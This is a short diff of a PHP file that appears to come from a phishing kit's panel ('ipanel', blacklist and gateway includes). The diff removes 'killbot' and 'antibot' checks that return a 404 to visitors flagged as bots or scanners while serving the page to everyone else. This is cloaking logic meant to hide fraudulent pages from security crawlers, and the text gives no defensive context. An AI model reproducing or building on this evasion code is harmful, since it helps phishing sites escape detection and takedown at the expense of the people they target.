@@ -11,26 +11,6 @@ if ($mobile_lock == "checked") {
 $url = $_SERVER['REQUEST_URI'];
 
 
-if ($enable_killbot == 1) {
-   if (checkkillbot($killbot_key) == true) {
-      header_remove();
-      header("Connection: close\r\n");
-      http_response_code(404);
-      exit;
-   }
-}
-
-
-if ($enable_antibot == 1) {
-   if (checkBot($antibot_key) == true) {
-      header_remove();
-      header("Connection: close\r\n");
-      http_response_code(404);
-      exit;
-   }
-}
-
-
 include 'ipanel/inc/blacklist.php';
 include 'ipanel/inc/gateway.php';
 if ($enable_antibots == "checked") {
